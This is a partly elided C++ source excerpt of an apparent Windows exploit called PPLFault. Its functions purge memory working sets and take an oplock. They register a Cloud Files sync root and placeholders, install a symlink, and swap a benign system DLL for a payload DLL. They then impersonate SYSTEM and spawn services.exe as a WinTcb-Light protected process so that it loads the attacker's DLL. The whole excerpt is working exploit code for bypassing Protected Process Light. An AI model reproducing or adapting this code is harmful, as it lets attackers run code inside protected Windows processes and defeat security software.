...
WIN32_FILE_ATTRIBUTE_DATA gBenignFileAttributes = { 0, }, gPayloadFileAttributes = { 0, };
...
bool EmptySystemWorkingSet()
{
    ...
    ntStatus = RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &ignore);
    if (0 != ntStatus)
    {
        PrintVerbose(L"Failed to enable SeProfileSingleProcessPrivilege with NTSTATUS 0x%08x\n", ntStatus);
        return false;
    }
	PrintVerbose(L"Enabled SeProfileSingleProcessPrivilege with NTSTATUS 0x%08x\n", ntStatus);
    ...
    if (0 != ntStatus)
    {
        PrintVerbose(L"Failed to empty working sets with NTSTATUS 0x%08x\n", ntStatus);
        return false;
    }
	PrintVerbose(L"Emptied working sets with NTSTATUS 0x%08x\n", ntStatus);
    ...
    if (0 != ntStatus)
    {
        PrintVerbose(L"Failed to empty standby list with NTSTATUS 0x%08x\n", ntStatus);
        return false;
    }

    PrintDebug(L"Working set purged\n");
...
bool AcquireOplock()
{
    ...
    {
        PrintVerbose(L"CreateFile for oplock failed with GLE %u\n", GetLastError());
        return false;
    }
    ...
    {
        PrintVerbose(L"DeviceIoControl for oplock succeeded when it should not have\n");
        CloseHandle(hFile);
    ...
    {
        PrintVerbose(L"DeviceIoControl for oplock failed with unexpected GLE %u\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(ovl.hEvent);
        return false;
    }
    ...
    )
{
    ...
    {
        PrintDebug(L"Switching to payload\n");
...
bool MoveFileWithPrivilege(const std::wstring& src, const std::wstring& dest)
{
    ...
    if (0 != ntStatus)
    {
        PrintVerbose(L"MoveFileWithPrivilege: RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE) failed with NTSTATUS 0x%08x\n", ntStatus);
        goto Cleanup;
    }
    ...
    if (0 != ntStatus)
    {
        PrintVerbose(L"MoveFileWithPrivilege: RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE) failed with NTSTATUS 0x%08x\n", ntStatus);
        goto Cleanup;
    }
    ...
    if (INVALID_HANDLE_VALUE == hFile)
    {
        PrintVerbose(L"MoveFileWithPrivilege: CreateFile failed with GLE %u\n", GetLastError());
        goto Cleanup;
    }
    ...
    {
        PrintVerbose(L"MoveFileWithPrivilege: SetFileInformationByHandle failed with GLE %u\n", GetLastError());
        goto Cleanup;
    }
...
bool CleanupSymlink()
{
    ...
    {
        PrintDebug(L"No cleanup necessary.  Backup does not exist.\n");
        return false;
    }
...
extern BOOL CheckRequirements();
extern BOOL Impersonate(_In_ HANDLE hToken);
extern BOOL ImpersonateSystem(_Out_ PHANDLE phSystemToken);
extern BOOL TokenCheckPrivilege(HANDLE hToken, LPCWSTR pwszPrivilege, BOOL bEnablePrivilege);

// Launches services.exe as WinTcb-Light and waits up to 5s for it
bool SpawnPPL()
{
    ...
    DWORD dwResult = 0;
	HANDLE hCurrentToken = NULL, hNewProcessToken = NULL, hSystemToken = NULL;

	if (!CheckRequirements())
	{
		PrintVerbose(L"SpawnPPL: CheckRequirements failed\n");
		return false;
	}

	if (!ImpersonateSystem(&hSystemToken))
	{
		PrintVerbose(L"SpawnPPL: ImpersonateSystem failed\n");
		return false;
	}
	...
	{
		PrintVerbose(L"SpawnPPL: Impersonate failed\n");
		return false;
	}
	...
	{
		PrintVerbose(L"SpawnPPL: OpenThreadToken failed\n");
		return false;
	}

	PrintDebug(L"SpawnPPL: Enable privilege %ws\n", SE_ASSIGNPRIMARYTOKEN_NAME);

	if (!TokenCheckPrivilege(hCurrentToken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE))
	{
		PrintVerbose(L"SpawnPPL: TokenCheckPrivilege failed\n");
		return false;
	}

	PrintDebug(L"SpawnPPL: Creating a primary token\n");

	if (!DuplicateTokenEx(hCurrentToken, MAXIMUM_ALLOWED, NULL, SecurityAnonymous, TokenPrimary, &hNewProcessToken))
	{
		PrintVerbose(L"SpawnPPL: DuplicateTokenEx failed\n");
		return false;
	}

	PrintDebug(L"SpawnPPL: Spawning PPL process\n");

    si.cb = sizeof(si);

    if (!CreateProcessAsUserW(hNewProcessToken, childPath.c_str(), NULL, NULL, NULL, TRUE, CREATE_PROTECTED_PROCESS, NULL, NULL, &si, &pi))
    {
        PrintVerbose(L"SpawnPPL: CreateProcessW failed with GLE: %u\n", GetLastError());
		RevertToSelf();
        return false;
    }
	RevertToSelf();
    ...
    {
        PrintVerbose(L"SpawnPPL: WaitForSingleObject returned %u.  Expected WAIT_OBJECT_0.  GLE: %u\n", dwResult, GetLastError());
    }
...
int PPLFault(_In_ DWORD dwTargetProcessId, _In_ LPWSTR pwszDllPath)
{
    ...
    {
        PrintVerbose(L"Failed to open file with GLE %u: %ws\n", GetLastError(), HIJACK_DLL_PATH);
        return 1;
    }
    ...
    if (!BuildPayload(hBenignFile, payloadBuf, dwTargetProcessId, pwszDllPath))
    {
        PrintVerbose(L"Failed to build payload\n");
        return 1;
    }
    ...
    {
        PrintVerbose(L"Failed to write payload file with GLE %u: %ws\n", GetLastError(), PAYLOAD_DLL_PATH);
        return 1;
    }
	else
        PrintVerbose(L"%d bytes written to payload file %ws\n", bytesWritten, PAYLOAD_DLL_PATH);
    ...
    if (!SUCCEEDED(hRet))
    {
        PrintVerbose(L"CfRegisterSyncRoot failed with HR 0x%08x GLE %u\n", hRet, GetLastError());
        return 1;
    }
    ...
    if (!SUCCEEDED(hRet))
    {
        ...
        PrintVerbose(L"CfConnectSyncRoot failed with HR 0x%08x GLE %u\n", hRet, GetLastError());
        return 1;
    }

    if (!GetFileAttributesExW(HIJACK_DLL_PATH, GetFileExInfoStandard, &gBenignFileAttributes))
    {
        PrintVerbose(L"GetFileAttributesExW on benign file failed with GLE %u\n", hRet, GetLastError());
        return 1;
    }

    if (!GetFileAttributesExW(pwszDllPath, GetFileExInfoStandard, &gPayloadFileAttributes))
    {
        PrintVerbose(L"GetFileAttributesExW on payload file failed with GLE %u\n", hRet, GetLastError());
        return 1;
    }
    ...
    {
        CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
        PrintVerbose(L"CfCreatePlaceholders failed with HR 0x%08x GLE %u\n", hRet, GetLastError());
        return 1;
    }
    ...
    if (!InstallSymlink())
    {
        PrintVerbose(L"InstallSymlink failed.  Aborting.\n");
        return 1;
    }

    PrintDebug(L"Benign: %ws\n", HIJACK_DLL_PATH_BACKUP);
    PrintDebug(L"Payload: %ws\n", PAYLOAD_DLL_PATH);
    PrintDebug(L"Placeholder: %ws\n", PLACEHOLDER_DLL_PATH);
    ...
    PrintDebug(L"Ready.  Spawning WinTcb.\n");
    if (!SpawnPPL())
    {
        goto Cleanup;
    }
